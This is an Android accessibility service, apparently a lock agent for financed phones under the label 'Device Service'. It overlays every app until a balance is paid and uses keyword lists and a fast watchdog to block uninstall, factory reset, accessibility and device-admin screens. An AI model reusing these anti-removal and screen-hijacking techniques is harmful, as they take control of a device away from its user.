package africa.volo.kismart.agent;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;

/**
 * Payment-debt lockdown + uninstall protection.
 * - While balance &gt; 0: ONLY the KISMART payment screen is allowed; every other app/surface is blocked.
 * - Always protects Device Service uninstall / factory reset / accessibility tampering.
 */
public class KismartAccessibilityService extends AccessibilityService {
    private static final long WATCHDOG_INTERVAL_MS = 200L;
    private static final long WATCHDOG_LIMIT_INTERVAL_MS = 100L;
    private static final long WATCHDOG_APP_INFO_INTERVAL_MS = 50L;
    private static final long EMERGENCY_ALLOW_MS = 30000L;
    private static final long KISMART_OPEN_ALLOW_MS = 5000L;
    /** Keep blocking App Info / uninstall for this long after Device Service is detected. */
    private static final long PROTECTED_SURFACE_STICKY_MS = 12000L;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Runnable watchdog = new Runnable() {
        @Override
        public void run() {
            checkBlockerState();
            long delay = WATCHDOG_INTERVAL_MS;
            if (System.currentTimeMillis() < protectedSurfaceUntil || watchingAppDetails) {
                delay = WATCHDOG_APP_INFO_INTERVAL_MS;
            } else if (DeviceControls.isPaymentLimitActive(KismartApi.lastPolicy(KismartAccessibilityService.this))
                    || DeviceControls.isFullLockPolicy(KismartApi.lastPolicy(KismartAccessibilityService.this))) {
                delay = WATCHDOG_LIMIT_INTERVAL_MS;
            }
            handler.postDelayed(this, delay);
        }
    };

    private WindowManager windowManager;
    private View blocker;
    private boolean blockerVisible;
    private boolean fullLockBlockerVisible;
    private long emergencyAllowedUntil;
    private long allowKismartOpenUntil;
    /** Sticky latch: once Device Service app info is seen, keep overlay until user leaves. */
    private long protectedSurfaceUntil;
    /** True while Settings App Details / Uninstaller activity class is in the foreground. */
    private boolean watchingAppDetails;
    private boolean optimisticAppDetailsBlock;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        DeviceControls.protectAppFromUninstall(this);

        String packageName = packageOf(event);
        String className = classOf(event);
        String eventText = eventText(event);

        // 1) App Details / Uninstaller activity opened → block IMMEDIATELY (no tree wait).
        //    Other apps' details may flash briefly then release if not Device Service.
        if (isAppDetailsOrUninstallClass(className) || isPackageInstallerPackage(packageName)) {
            watchingAppDetails = true;
            if (isProtectionArmed()) {
                if (mentionsProtectedApp(eventText) || packageNameHintsProtectedApp(eventText, className)) {
                    armProtectedSurface();
                    showBlockerNow();
                    return;
                }
                // Optimistic: cover App Info before labels finish loading.
                optimisticAppDetailsBlock = true;
                showBlockerNow();
                // Confirm within a few frames whether this is Device Service.
                handler.post(this::confirmOptimisticAppDetailsBlock);
                handler.postDelayed(this::confirmOptimisticAppDetailsBlock, 40L);
                handler.postDelayed(this::confirmOptimisticAppDetailsBlock, 100L);
                handler.postDelayed(this::confirmOptimisticAppDetailsBlock, 200L);
                return;
            }
        }

        // 2) Any event text mentioning Device Service / package → sticky block now.
        if (isProtectionArmed() && (mentionsProtectedApp(eventText) || isRestrictedContent(eventText))) {
            if (isSettingsLikePackage(packageName)
                    || isPackageInstallerPackage(packageName)
                    || isAppDetailsOrUninstallClass(className)
                    || isRestrictedContent(eventText)) {
                armProtectedSurface();
                showBlockerNow();
                return;
            }
        }

        // 3) Sticky latch still active while in Settings/installer.
        if (System.currentTimeMillis() < protectedSurfaceUntil) {
            if (isSettingsLikePackage(packageName) || isPackageInstallerPackage(packageName) || packageName.isEmpty()) {
                showBlockerNow();
                return;
            }
            // Left Settings — drop sticky.
            if (!isSettingsLikePackage(packageName) && !isPackageInstallerPackage(packageName)) {
                protectedSurfaceUntil = 0L;
                watchingAppDetails = false;
                optimisticAppDetailsBlock = false;
            }
        }

        // 4) Fast find-by-text on Settings (no full tree walk).
        if (isProtectionArmed() && (isSettingsLikePackage(packageName) || isPackageInstallerPackage(packageName))) {
            if (sourceMentionsProtectedAppFast()) {
                armProtectedSurface();
                showBlockerNow();
                return;
            }
        }

        checkBlockerState();
    }

    @Override
    public void onInterrupt() {}

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        DeviceControls.protectAppFromUninstall(this);
        configureService();
        handler.removeCallbacks(watchdog);
        checkBlockerState();
        handler.post(watchdog);
    }

    @Override
    public void onDestroy() {
        handler.removeCallbacks(watchdog);
        hideBlockerNow();
        try {
            AgentSyncService.start(this);
        } catch (Exception ignored) {
        }
        super.onDestroy();
    }

    private void configureService() {
        AccessibilityServiceInfo info = getServiceInfo();
        if (info == null) info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 0L;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        setServiceInfo(info);
    }

    private void armProtectedSurface() {
        protectedSurfaceUntil = System.currentTimeMillis() + PROTECTED_SURFACE_STICKY_MS;
        optimisticAppDetailsBlock = false;
        watchingAppDetails = true;
    }

    private void confirmOptimisticAppDetailsBlock() {
        if (!optimisticAppDetailsBlock && System.currentTimeMillis() >= protectedSurfaceUntil) return;
        if (sourceMentionsProtectedAppFast() || screenMentionsProtectedAppFast()) {
            armProtectedSurface();
            showBlockerNow();
            return;
        }
        // Still on App Details class? keep optimistic cover a bit longer.
        String pkg = activePackageName();
        if (watchingAppDetails && (isSettingsLikePackage(pkg) || isPackageInstallerPackage(pkg))) {
            if (sourceMentionsProtectedAppFast()) {
                armProtectedSurface();
                showBlockerNow();
            }
            // Do not hide yet — labels may still be loading. A later tick will hide if not ours.
            handler.postDelayed(this::releaseOptimisticIfNotProtected, 180L);
            return;
        }
        releaseOptimisticIfNotProtected();
    }

    private void releaseOptimisticIfNotProtected() {
        if (System.currentTimeMillis() < protectedSurfaceUntil) {
            showBlockerNow();
            return;
        }
        if (sourceMentionsProtectedAppFast() || screenMentionsProtectedAppFast()) {
            armProtectedSurface();
            showBlockerNow();
            return;
        }
        // Confirmed not Device Service app info — release optimistic block only.
        optimisticAppDetailsBlock = false;
        watchingAppDetails = false;
        if (blockerVisible) {
            // Re-evaluate normal limit / financed rules (do not leave a stuck overlay on other apps' App Info).
            checkBlockerState();
        }
    }

    private boolean isProtectionArmed() {
        Policy policy = KismartApi.lastPolicy(this);
        if (DeviceControls.isPaymentLimitActive(policy) || DeviceControls.isFullLockPolicy(policy)) {
            return true;
        }
        if (DeviceControls.isFinancedPolicy(policy)) return true;
        String imei = KismartApi.prefs(this).getString(KismartApi.KEY_IMEI, "");
        return imei != null && !imei.trim().isEmpty();
    }

    // ========== Main decision logic ==========
    private void checkBlockerState() {
        Policy policy = KismartApi.lastPolicy(this);
        String packageName = activePackageName();

        // Never block KISMART itself (payment / account UI).
        if (!packageName.isEmpty() && getPackageName().equals(packageName)) {
            hideBlockerNow();
            protectedSurfaceUntil = 0L;
            watchingAppDetails = false;
            optimisticAppDetailsBlock = false;
            return;
        }

        // Sticky: Device Service app info / uninstall already identified.
        if (System.currentTimeMillis() < protectedSurfaceUntil) {
            if (packageName.isEmpty()
                    || isSettingsLikePackage(packageName)
                    || isPackageInstallerPackage(packageName)
                    || isLauncherPackage(packageName)) {
                showBlockerNow();
                return;
            }
            protectedSurfaceUntil = 0L;
        }

        // Fast Device Service detection (findAccessibilityNodeInfosByText — much faster than full walk).
        if (isProtectionArmed()
                && (isSettingsLikePackage(packageName) || isPackageInstallerPackage(packageName) || watchingAppDetails)) {
            if (sourceMentionsProtectedAppFast() || screenMentionsProtectedAppFast()) {
                armProtectedSurface();
                showBlockerNow();
                return;
            }
            // Optimistic cover only while App Details labels may still be loading for an unknown app.
            if (optimisticAppDetailsBlock) {
                showBlockerNow();
                return;
            }
        }

        // Named restricted screens (factory reset / accessibility / device admin / our app info).
        if (!packageName.isEmpty() && isDangerousScreenNow(packageName)) {
            showBlockerNow();
            return;
        }

        watchingAppDetails = false;
        optimisticAppDetailsBlock = false;

        if (policy == null) {
            hideBlockerNow();
            return;
        }

        if (DeviceControls.isFullLockPolicy(policy)) {
            showFullLockBlockerNow();
            DeviceControls.enforceFullLock(this);
            return;
        }

        // Unpaid debt: ONLY the KISMART payment screen is allowed. No Settings, launcher,
        // browser, or other apps until payment is confirmed (balance cleared).
        if (DeviceControls.isPaymentLimitActive(policy) || (policy != null && policy.balance > 0)) {
            // Emergency dialer grace window after user taps Emergency 112.
            if (System.currentTimeMillis() < emergencyAllowedUntil) {
                hideBlockerNow();
                return;
            }
            // Brief grace while we launch KISMART itself.
            if (System.currentTimeMillis() < allowKismartOpenUntil
                    && (packageName.isEmpty() || getPackageName().equals(packageName))) {
                hideBlockerNow();
                return;
            }
            if (packageName.isEmpty() || !getPackageName().equals(packageName)) {
                showBlockerNow();
                // Immediately yank the user back to the payment screen.
                openPaymentPrompt();
                return;
            }
            hideBlockerNow();
            return;
        }

        if (!DeviceControls.isFinancedPolicy(policy)) {
            hideBlockerNow();
            return;
        }

        hideBlockerNow();
    }

    private String packageOf(AccessibilityEvent event) {
        CharSequence value = event.getPackageName();
        return value == null ? "" : value.toString().trim();
    }

    private String classOf(AccessibilityEvent event) {
        CharSequence value = event.getClassName();
        return value == null ? "" : value.toString();
    }

    private String eventText(AccessibilityEvent event) {
        StringBuilder builder = new StringBuilder();
        try {
            if (event.getText() != null) {
                for (CharSequence item : event.getText()) {
                    if (item != null) builder.append(' ').append(item);
                }
            }
            if (event.getContentDescription() != null) {
                builder.append(' ').append(event.getContentDescription());
            }
            if (event.getClassName() != null) {
                builder.append(' ').append(event.getClassName());
            }
        } catch (Exception ignored) {
        }
        return builder.toString().toLowerCase();
    }

    /**
     * Fast protected-app detection using framework text search (avoids slow full-tree collection).
     */
    private boolean sourceMentionsProtectedAppFast() {
        AccessibilityNodeInfo root = null;
        try {
            root = getRootInActiveWindow();
            return mentionsProtectedAppInRoot(root);
        } catch (Exception ignored) {
            return false;
        } finally {
            if (root != null) root.recycle();
        }
    }

    private boolean screenMentionsProtectedAppFast() {
        try {
            for (AccessibilityWindowInfo window : getWindows()) {
                if (window == null) continue;
                AccessibilityNodeInfo root = window.getRoot();
                if (root == null) continue;
                try {
                    if (mentionsProtectedAppInRoot(root)) return true;
                } finally {
                    root.recycle();
                }
            }
        } catch (Exception ignored) {
        }
        return false;
    }

    private boolean mentionsProtectedAppInRoot(AccessibilityNodeInfo root) {
        if (root == null) return false;
        String[] needles = protectedAppNeedles();
        for (String needle : needles) {
            if (needle == null || needle.isEmpty()) continue;
            java.util.List<AccessibilityNodeInfo> hits = null;
            try {
                hits = root.findAccessibilityNodeInfosByText(needle);
                if (hits != null && !hits.isEmpty()) return true;
            } catch (Exception ignored) {
            } finally {
                if (hits != null) {
                    for (AccessibilityNodeInfo node : hits) {
                        try {
                            node.recycle();
                        } catch (Exception ignored) {
                        }
                    }
                }
            }
        }
        // Also check package name in view ids / shallow text.
        try {
            CharSequence pkg = root.getPackageName();
            if (pkg != null && mentionsProtectedApp(pkg.toString())) return true;
        } catch (Exception ignored) {
        }
        return false;
    }

    private String[] protectedAppNeedles() {
        return new String[]{
                getString(R.string.app_name),
                "Device Service",
                "device service",
                "KISMART",
                "Kismart",
                getPackageName(),
                "africa.volo.kismart",
                "africa.volo.kismart.agent"
        };
    }

    private boolean isAppDetailsOrUninstallClass(String className) {
        if (className == null || className.isEmpty()) return false;
        String c = className.toLowerCase();
        return c.contains("installedappdetails")
                || c.contains("appinfodashboard")
                || c.contains("applicationdetails")
                || c.contains("appinfo")
                || c.contains("applicationsettings")
                || c.contains("installedapp")
                || c.contains("uninstaller")
                || c.contains("uninstallapp")
                || c.contains("packinstaller")
                || c.contains("packageinstaller")
                || c.contains("applicationinfo")
                || c.contains("manageapplications")
                || c.contains("installedappdetails top")
                || c.contains("spacemanager")
                || c.contains("storagesettings");
    }

    private boolean packageNameHintsProtectedApp(String eventText, String className) {
        return mentionsProtectedApp(eventText) || mentionsProtectedApp(className);
    }

    /** Checks package type and on-screen content for the named restricted surfaces only. */
    private boolean isDangerousScreenNow(String packageName) {
        // Prefer fast search first.
        if (sourceMentionsProtectedAppFast() || screenMentionsProtectedAppFast()) {
            if (isSettingsLikePackage(packageName)
                    || isPackageInstallerPackage(packageName)
                    || watchingAppDetails) {
                armProtectedSurface();
                return true;
            }
        }
        if (isPackageInstallerPackage(packageName)) {
            String text = collectQuickScreenText();
            if (mentionsProtectedApp(text) || isUninstallConfirmation(text)) {
                armProtectedSurface();
                return true;
            }
        }
        if (isSettingsLikePackage(packageName) || isPackageInstallerPackage(packageName)) {
            return isDangerousSettingsScreenContent() || isDangerousRemovalSurfaceContent();
        }
        return isDangerousRemovalSurfaceContent();
    }

    private String collectQuickScreenText() {
        AccessibilityNodeInfo root = null;
        try {
            root = getRootInActiveWindow();
            if (root == null) return "";
            // Shallow walk only — full depth was too slow and let uninstall win the race.
            StringBuilder builder = new StringBuilder();
            appendNodeText(root, builder, 0, 4, 4000);
            return builder.toString().toLowerCase();
        } catch (Exception ignored) {
            return "";
        } finally {
            if (root != null) root.recycle();
        }
    }

    private boolean isDangerousSettingsScreenContent() {
        String text = collectQuickScreenText();
        if (isRestrictedContent(text)) {
            if (isProtectedAppManagementScreen(text) || mentionsProtectedApp(text)) {
                armProtectedSurface();
            }
            return true;
        }
        return false;
    }

    private boolean isDangerousRemovalSurfaceContent() {
        String text = collectQuickScreenText();
        if (isProtectedAppManagementScreen(text) || isUninstallConfirmation(text)) {
            armProtectedSurface();
            return true;
        }
        return false;
    }

    private boolean isRestrictedContent(String text) {
        if (text == null || text.isEmpty()) return false;
        return isFactoryResetScreen(text)
                || isAccessibilityControlScreen(text)
                || isDeviceAdminControlScreen(text)
                || isProtectedAppManagementScreen(text);
    }

    // ---------- Keyword matchers (named screens only) ----------
    private boolean isFactoryResetScreen(String text) {
        // Includes Settings search hits for factory reset wording.
        return containsAny(text,
                "factory reset", "factory data reset", "reset options",
                "erase all data", "erase all content", "erase all content and settings",
                "delete all data", "delete all contents", "reset phone", "reset tablet",
                "wipe data", "format data", "restore factory settings", "clear all data",
                "erase phone", "erase tablet", "erasing", "factory data");
    }

    private boolean isAccessibilityControlScreen(String text) {
        if (!text.contains("accessibility")) return false;
        // Always block accessibility settings while protection is active (can disable this service).
        if (text.contains("kismart") || text.contains("device service")) return true;
        return containsAny(text,
                "downloaded apps", "installed apps", "installed services",
                "accessibility shortcut", "volume key shortcut",
                "screen reader", "interaction controls", "use service", "stop service",
                "turn off", "turn on", "allow restricted setting", "device service",
                "accessibility services", "downloaded services");
    }

    private boolean isDeviceAdminControlScreen(String text) {
        return containsAny(text,
                "device admin apps", "device administrator", "device administrators",
                "deactivate this device admin app", "deactivate device admin", "device admin");
    }

    private boolean isProtectedAppManagementScreen(String text) {
        String lower = text == null ? "" : text.toLowerCase();
        if (!mentionsProtectedApp(lower)) return false;
        return containsAny(lower,
                "uninstall", "uninstall app", "delete", "delete app",
                "remove app", "remove from device", "remove this app",
                "app info", "application info", "app details", "manage app", "manage apps",
                "disable", "deactivate", "device admin", "device administrator",
                "force stop", "clear data", "clear cache", "storage", "trash",
                "drag here to uninstall", "open by default", "set as default",
                "permissions", "force stop");
    }

    private boolean isUninstallConfirmation(String text) {
        return containsAny(text,
                "do you want to uninstall", "uninstall app", "drag here to uninstall",
                "this app will be removed", "uninstall this app");
    }

    private boolean mentionsProtectedApp(String text) {
        if (text == null || text.isEmpty()) return false;
        String lower = text.toLowerCase();
        String appLabel = getString(R.string.app_name).toLowerCase();
        String packageName = getPackageName().toLowerCase();
        return lower.contains("kismart")
                || lower.contains("device service")
                || lower.contains(appLabel)
                || lower.contains(packageName)
                || lower.contains("africa.volo.kismart");
    }

    private boolean containsAny(String text, String... needles) {
        if (text == null) return false;
        for (String needle : needles) {
            if (needle != null && text.contains(needle)) return true;
        }
        return false;
    }

    // ---------- Package type helpers ----------
    private boolean isSettingsLikePackage(String pkg) {
        String v = pkg == null ? "" : pkg.toLowerCase();
        return "com.android.settings".equals(v)
                || v.endsWith(".settings")
                || v.contains(".settings.")
                || v.contains("securitycenter")
                || v.contains("permissioncontroller")
                || v.contains("systemmanager")
                || v.contains("safecenter")
                || v.contains("permcenter")
                || v.contains("smartmanager")
                || v.contains("settings.intelligence");
    }

    private boolean isPackageInstallerPackage(String pkg) {
        String v = pkg == null ? "" : pkg.toLowerCase();
        return v.contains("packageinstaller")
                || v.contains("installer")
                || v.equals("com.google.android.packageinstaller")
                || v.equals("com.android.packageinstaller")
                || v.equals("com.miui.packageinstaller")
                || v.equals("com.samsung.android.packageinstaller");
    }

    private boolean isLauncherPackage(String packageName) {
        String v = packageName == null ? "" : packageName.toLowerCase();
        return v.contains("launcher") || v.contains(".home")
                || v.equals("com.miui.home")
                || v.equals("com.android.launcher")
                || v.equals("com.google.android.apps.nexuslauncher");
    }

    private boolean isAllowedSystemPackage(String packageName) {
        if ("android".equals(packageName)) return true;
        if ("com.android.systemui".equals(packageName)) return true;
        if (System.currentTimeMillis() < emergencyAllowedUntil && isEmergencyPackage(packageName)) {
            return true;
        }
        return false;
    }

    private boolean isEmergencyPackage(String packageName) {
        String v = packageName == null ? "" : packageName.toLowerCase();
        return v.contains("dialer") || v.contains("incallui")
                || v.contains("telecom") || v.contains("contacts");
    }

    private boolean isOverlayEventPackage(String packageName) {
        String value = packageName == null ? "" : packageName.trim();
        return getPackageName().equals(value)
                || "android".equals(value)
                || "com.android.systemui".equals(value);
    }

    // ========== Blocker show / hide (immediate, input-capturing) ==========
    private void showBlockerNow() {
        if (blockerVisible && !fullLockBlockerVisible) return;
        showBlocker(buildBlocker(), false);
    }

    private void showFullLockBlockerNow() {
        if (blockerVisible && fullLockBlockerVisible) return;
        showBlocker(buildFullLockBlocker(), true);
    }

    private void showBlocker(View nextBlocker, boolean fullLockBlocker) {
        if (blockerVisible) hideBlockerNow();

        if (windowManager == null) windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        if (windowManager == null) return;

        try {
            blocker = nextBlocker;
            // Capture touches immediately so the user cannot keep navigating under the overlay.
            int flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                    | WindowManager.LayoutParams.FLAG_SECURE
                    | WindowManager.LayoutParams.FLAG_FULLSCREEN
                    | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON;
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    flags,
                    PixelFormat.TRANSLUCENT);
            params.gravity = Gravity.TOP | Gravity.START;
            params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN;
            windowManager.addView(blocker, params);
            blockerVisible = true;
            fullLockBlockerVisible = fullLockBlocker;
            try {
                blocker.requestFocus();
            } catch (Exception ignored) {
            }
        } catch (Exception e) {
            blockerVisible = false;
            fullLockBlockerVisible = false;
            blocker = null;
        }
    }

    private void hideBlockerNow() {
        if (!blockerVisible || blocker == null || windowManager == null) return;
        try {
            windowManager.removeView(blocker);
        } catch (Exception ignored) {
        } finally {
            blocker = null;
            blockerVisible = false;
            fullLockBlockerVisible = false;
        }
    }

    // ========== Helpers ==========
    private String activePackageName() {
        AccessibilityNodeInfo root = null;
        try {
            root = activeInspectionRoot();
            if (root == null || root.getPackageName() == null) return "";
            return root.getPackageName().toString();
        } catch (Exception ignored) {
            return "";
        } finally {
            if (root != null) root.recycle();
        }
    }

    private AccessibilityNodeInfo activeInspectionRoot() {
        try {
            for (AccessibilityWindowInfo window : getWindows()) {
                if (window == null) continue;
                if (window.getType() != AccessibilityWindowInfo.TYPE_APPLICATION) continue;
                AccessibilityNodeInfo root = window.getRoot();
                if (root == null) continue;
                CharSequence packageName = root.getPackageName();
                if (packageName == null || !getPackageName().equals(packageName.toString())) {
                    return root;
                }
                root.recycle();
            }
        } catch (Exception ignored) {
        }
        return getRootInActiveWindow();
    }

    private String collectScreenText(AccessibilityNodeInfo root) {
        StringBuilder builder = new StringBuilder();
        appendNodeText(root, builder, 0, 5, 6000);
        return builder.toString();
    }

    private void appendNodeText(
            AccessibilityNodeInfo node,
            StringBuilder builder,
            int depth,
            int maxDepth,
            int maxChars
    ) {
        if (node == null || depth > maxDepth || builder.length() > maxChars) return;
        appendText(builder, node.getText());
        appendText(builder, node.getContentDescription());
        appendText(builder, node.getViewIdResourceName());
        int childCount = node.getChildCount();
        // Cap breadth for speed on dense Settings trees.
        int limit = Math.min(childCount, depth == 0 ? 40 : 24);
        for (int i = 0; i < limit; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                appendNodeText(child, builder, depth + 1, maxDepth, maxChars);
                child.recycle();
            }
        }
    }

    private void appendText(StringBuilder builder, CharSequence value) {
        if (value == null) return;
        String text = value.toString().trim();
        if (!text.isEmpty()) builder.append(' ').append(text);
    }

    // ========== UI ==========
    private View buildFullLockBlocker() {
        FrameLayout root = new FrameLayout(this);
        root.setBackgroundColor(Color.BLACK);
        root.setClickable(true);
        root.setFocusable(true);
        root.setFocusableInTouchMode(true);
        return root;
    }

    private View buildBlocker() {
        FrameLayout root = new FrameLayout(this);
        root.setBackgroundColor(Color.WHITE);
        root.setClickable(true);
        root.setFocusable(true);

        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setGravity(Gravity.CENTER);
        int side = dp(28);
        content.setPadding(side, side, side, side);

        TextView title = new TextView(this);
        title.setText("PAYMENT REQUIRED");
        title.setTextColor(Color.rgb(10, 15, 13));
        title.setTextSize(24);
        title.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);

        TextView message = new TextView(this);
        message.setText("This phone needs a payment to continue.");
        message.setTextColor(Color.rgb(62, 74, 68));
        message.setTextSize(15);
        message.setGravity(Gravity.CENTER);
        message.setLineSpacing(dp(2), 1.0f);

        Button open = new Button(this);
        open.setText("Pay Now");
        open.setTextColor(Color.WHITE);
        open.setTextSize(14);
        open.setAllCaps(false);
        open.setBackgroundColor(Color.rgb(10, 15, 13));
        open.setOnClickListener(view -> openPaymentPrompt());

        Button emergency = new Button(this);
        emergency.setText("Emergency 112");
        emergency.setTextColor(Color.rgb(10, 15, 13));
        emergency.setTextSize(14);
        emergency.setAllCaps(false);
        emergency.setBackgroundColor(Color.rgb(228, 235, 231));
        emergency.setOnClickListener(view -> {
            emergencyAllowedUntil = System.currentTimeMillis() + EMERGENCY_ALLOW_MS;
            hideBlockerNow();
            DeviceControls.callEmergency(this);
        });

        content.addView(title, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT));
        content.addView(message, spacedParams());
        content.addView(open, buttonParams());
        content.addView(emergency, buttonParams());

        root.addView(content, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT));
        return root;
    }

    private LinearLayout.LayoutParams spacedParams() {
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, dp(16), 0, dp(20));
        return params;
    }

    private LinearLayout.LayoutParams buttonParams() {
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, dp(48));
        params.setMargins(0, dp(8), 0, 0);
        return params;
    }

    private void openPaymentPrompt() {
        allowKismartOpenUntil = System.currentTimeMillis() + KISMART_OPEN_ALLOW_MS;
        hideBlockerNow();
        DeviceControls.forcePaymentScreen(this);
    }

    private int dp(int value) {
        return Math.round(value * getResources().getDisplayMetrics().density);
    }
}
